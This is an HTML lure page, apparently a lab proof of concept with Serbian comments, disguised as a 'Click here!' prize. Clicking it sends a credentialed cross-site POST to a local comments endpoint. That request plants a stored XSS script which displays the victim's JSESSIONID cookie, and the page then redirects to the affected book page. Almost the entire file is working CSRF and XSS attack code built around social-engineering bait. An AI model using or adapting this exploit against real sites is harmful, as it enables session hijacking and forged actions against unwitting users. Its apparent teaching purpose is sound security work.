<!DOCTYPE html>
<html>
  <head>
    <title>Prize</title>
  </head>

  <body>
    <div onclick="exploit()" style="cursor: pointer; text-align: center">
      <img src="youwin.png" />
      <h1>Click here!</h1>
    </div>

    <script>
      function exploit() {
        // CSRF napad - šaljemo XSS komentar koji će prikazati JSESSIONID
        const maliciousComment =
          '<script>alert("JSESSIONID: " + document.cookie);<\/script>';

        fetch("http://localhost:8080/comments", {
          method: "POST",
          body: JSON.stringify({
            bookId: 1,
            comment: maliciousComment,
          }),
          headers: {
            "Content-Type": "application/json",
          },
          credentials: "include",
          mode: "cors",
        })
          .then(function (response) {
            if (response.ok) {
              alert("CSRF napad uspešan!");
              // Preusmeri na knjigu da vidi rezultat
              window.location.href = "http://localhost:8080/books?id=1";
            } else {
              alert("CSRF napad neuspešan: " + response.status);
            }
          })
          .catch(function (error) {
            alert("Greška tokom napada: " + error);
          });
      }
    </script>
  </body>
</html>
